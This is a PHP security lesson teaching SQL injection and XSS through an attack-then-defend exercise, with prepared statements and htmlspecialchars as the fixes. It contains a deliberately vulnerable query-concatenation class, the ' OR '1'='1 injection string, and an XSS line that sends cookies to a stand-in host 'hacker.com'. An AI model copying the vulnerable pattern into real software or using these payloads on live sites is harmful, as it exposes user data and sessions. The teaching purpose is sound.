### Lesson #21 (Final): Security: Hacker Mindset (SQL Injection, XSS)

In the "Deliberate Practice" methodology, we do not teach security rules. We teach how to **break code**. You won't understand why Prepared Statements are needed until you personally delete a database via a login input field.

#### THEORY: Why escaping doesn't work?

**1\. SQL Injection (SQLi)**

- **Naive approach:** The developer thinks: _"I'll just remove quotes from user input, and everything will be fine."_
- **Reality:** Hackers don't need quotes.
- **Mental Model (Prepared Statements):**

  - In the old approach (concatenation), you send a "mixture" of commands and data to the DB. The DB doesn't know where the `SELECT` command ends and the name `O'Brian` begins.
  - In **Prepared Statements** (PDO), you first send a _Template_ (`SELECT * FROM users WHERE name = ?`). The DB compiles this plan. And only then do you send the _Data_. The DB knows: "Everything that comes in the second packet is just text, even if it says `DROP TABLE`."

**2\. XSS (Cross-Site Scripting)**

- **Naive approach:** `echo $userName;`
- **Attack:** A user with the name `<script>sendCookiesTo('hacker.com')</script>` visits the page. Everyone who sees their name will have their session stolen.
- **Defense:** Contextual escaping. Turning `<` into `&lt;`.

---

### TASK (Practice: Red Team vs Blue Team)

We will create a vulnerable class and a database in memory (SQLite). Your task is to first hack it, and then fix it.

**Context:** We have a repository that searches for users by email.

PHP

        // ⛔ VULNERABLE CODE (Don't copy this into the solution, this is "Given")
        class VulnerableUserRepo {
            public function __construct(private PDO $pdo) {}

            public function findByEmail(string $email): array {
                // HORROR: Direct variable insertion
                $sql = "SELECT id, name, email FROM users WHERE email = '$email'";
                return $this->pdo->query($sql)->fetchAll();
            }
        }

**Task 1: Attack (Red Team)** Write a script that calls `findByEmail` with an `$email` such that the SQL query turns into fetching **ALL users**, not just one.

- _Hint:_ Use the `' OR ...` operator.
- Show the `$maliciousEmail` string in the answer.

**Task 2: Defense (Blue Team)** Rewrite the class to `SecureUserRepo`.

- Use `PDO::prepare()` and `execute()`.
- Use named placeholders (`:email`).

**Task 3: XSS Defense** Imagine the DB contains a username: `<script>alert('pwned')</script>`. Write an `HtmlView` class that accepts an array of users and outputs their names in an HTML list `<ul>...</ul>`.

- If output directly — the script executes.
- Implement the `render(array $users): string` method using `htmlspecialchars()`.

**Constraints:**

- Use `PDO` with the `sqlite::memory:` driver.
- Strict types.
- In the solution, show both the successful hack (dumping all users through the hole) and the defense.

Awaiting your final exam. Hack it, then protect it.

### Debriefing

#### Why did SQL Injection work?

Because in `VulnerableUserRepo`, data and code were mixed into one string. The database cannot guess where the programmer's command ends and the user's trickery begins.

#### Why did Prepared Statements protect us?

When we use `$stmt->execute(['email' => $maliciousEmail])`, the database driver sends the data in a separate packet. The DB literally says: "Find me the user whose email field contains the text: `' OR '1'='1`". Naturally, there is no such user. The hack code turned into a regular meaningless string.

#### Why didn't XSS work?

The `htmlspecialchars` function took the dangerous string `<script>alert("HACKED")</script>` and turned it into a safe one: `&lt;script&gt;alert(&quot;HACKED&quot;)&lt;/script&gt;`.

The browser sees `&lt;`, understands that it needs to draw the "less than" symbol, but **does not perceive** it as the start of an HTML tag. The script is neutralized.
